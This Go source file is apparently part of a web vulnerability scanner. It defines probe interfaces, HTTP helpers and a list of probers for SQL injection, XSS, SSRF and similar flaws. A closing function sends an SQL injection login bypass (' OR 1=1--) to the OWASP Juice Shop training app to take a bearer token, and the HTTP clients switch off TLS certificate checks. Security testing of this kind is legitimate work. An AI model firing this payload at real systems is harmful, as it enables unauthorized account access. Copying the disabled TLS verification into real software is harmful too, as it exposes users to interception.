package probers

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/ouroboros-security/ouroboros/pkg/types"
)

// Prober is the interface that all technique-specific probers implement.
type Prober interface {
	Name() string
	Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding
}

// ProberConfig holds shared configuration for probers.
type ProberConfig struct {
	BaseURL   string
	AuthToken string // JWT token for authenticated scanning
	Client    *http.Client
}

// NewProberConfig creates a ProberConfig from a target.
func NewProberConfig(target types.Target) *ProberConfig {
	return &ProberConfig{
		BaseURL:   strings.TrimRight(target.URL, "/"),
		AuthToken: target.Headers["Authorization"],
		Client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// DoRequest sends an HTTP request and returns status, headers, and body.
func (c *ProberConfig) DoRequest(method, url string, body io.Reader, headers map[string]string) (int, http.Header, string, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return 0, nil, "", err
	}
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := c.Client.Do(req)
	if err != nil {
		return 0, nil, "", err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	return resp.StatusCode, resp.Header, string(respBody), nil
}

// DoRequestRaw sends a request and returns the raw response.
func (c *ProberConfig) DoRequestRaw(method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	return c.Client.Do(req)
}

// MakeFinding is a helper to create a finding with common fields.
func MakeFinding(title, severity, desc, endpoint, method, cwe, poc, evidence, technique string, loop int) types.Finding {
	sev, _ := types.ParseSeverity(severity)
	f := types.Finding{
		Title:       title,
		Description: desc,
		Severity:    sev,
		Endpoint:    endpoint,
		Method:      method,
		CWE:         cwe,
		PoC:         poc,
		Evidence:    evidence,
		Technique:   technique,
		Confirmed:   true,
		FoundAt:     time.Now(),
		Loop:        loop,
	}
	f.ID = f.Signature()
	return f
}

// AllProbers returns all registered probers.
func AllProbers() []Prober {
	return []Prober{
		&SQLiProber{},
		&XSSProber{},
		&IDORProber{},
		&AuthProber{},
		&InfoLeakProber{},
		&InjectionProber{},
		&HeadersProber{},
		&FileUploadProber{},
		&SSRFProber{},
		&CryptoProber{},
	}
}

// RunAllProbers runs every prober against the target and returns combined findings.
func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.Endpoint, loop int) []types.Finding {
	var all []types.Finding
	for _, p := range AllProbers() {
		select {
		case <-ctx.Done():
			return all
		default:
		}
		findings := p.Probe(ctx, target, endpoints)
		for i := range findings {
			findings[i].Loop = loop
			findings[i].ID = findings[i].Signature()
		}
		all = append(all, findings...)
	}
	return all
}

// LoginJuiceShop performs SQLi login bypass and returns the auth token.
func LoginJuiceShop(baseURL string) (string, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	loginURL := strings.TrimRight(baseURL, "/") + "/rest/user/login"
	payload := `{"email":"' OR 1=1--","password":"anything"}`
	resp, err := client.Post(loginURL, "application/json", strings.NewReader(payload))
	if err != nil {
		return "", fmt.Errorf("login request failed: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("login failed with status %d", resp.StatusCode)
	}

	bodyStr := string(body)
	// Extract token from response
	if idx := strings.Index(bodyStr, `"token":"`); idx >= 0 {
		start := idx + len(`"token":"`)
		end := strings.Index(bodyStr[start:], `"`)
		if end > 0 {
			return "Bearer " + bodyStr[start:start+end], nil
		}
	}
	return "", fmt.Errorf("token not found in response: %s", truncate(bodyStr, 200))
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
